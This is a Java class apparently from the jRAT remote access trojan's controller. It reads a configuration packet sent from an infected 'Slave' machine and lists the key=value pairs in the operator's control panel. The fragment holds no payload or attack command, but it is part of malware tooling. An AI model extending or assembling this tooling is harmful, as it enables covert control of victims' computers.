package io.jrat.controller.packets.incoming;

import io.jrat.controller.Slave;
import io.jrat.controller.ui.frames.FrameControlPanel;
import io.jrat.controller.ui.panels.PanelControlConfig;

import java.io.DataInputStream;


public class Packet66Config extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		int len = slave.readInt();

		String[] config = new String[len];

		for (int i = 0; i < len; i++) {
			config[i] = slave.readLine();
		}

		FrameControlPanel frame = FrameControlPanel.instances.get(slave);

		if (frame != null) {
			PanelControlConfig panel = (PanelControlConfig) frame.panels.get("config");

			for (String str : config) {
				try {
					String[] args = str.split("=");
					String k = args[0];
					String v = args[1];
					panel.getModel().addRow(new Object[] { k, v });
				} catch (Exception ex) {
					ex.printStackTrace();
				}
			}
		}
	}

}
